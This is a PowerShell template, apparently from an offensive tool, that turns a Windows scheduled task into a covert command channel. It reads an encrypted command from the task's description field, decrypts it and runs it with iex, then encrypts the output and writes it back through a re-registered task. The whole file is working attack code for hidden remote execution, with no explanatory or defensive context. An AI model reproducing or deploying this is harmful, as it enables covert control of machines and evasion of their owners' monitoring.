$taskPath = "\"
$encryptionKey = [System.Convert]::FromBase64String("{key_b64}")
{common_ps}

$scheduler = New-Object -ComObject Schedule.Service
$scheduler.Connect()
try {{
    $folder = $scheduler.GetFolder($taskPath)
    $task = $folder.GetTask("{taskname}")
    $definition = $task.Definition
    $description = $definition.RegistrationInfo.Description

    $decryptedDescription = Decrypt-Data $encryptionKey $description
    $executionResult = iex $decryptedDescription | Out-String
    $encryptedResult = Encrypt-Data $encryptionKey $executionResult

    $definition.RegistrationInfo.Description = $encryptedResult
    $user = $task.Principal.UserId
    $folder.RegisterTaskDefinition($task.Name, $definition, 6, $user, $null, $task.Definition.Principal.LogonType)
}}catch {{
    Write-Error "Failed.."
}}
finally {{
    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($scheduler) | Out-Null
}}
[Environment]::Exit(0)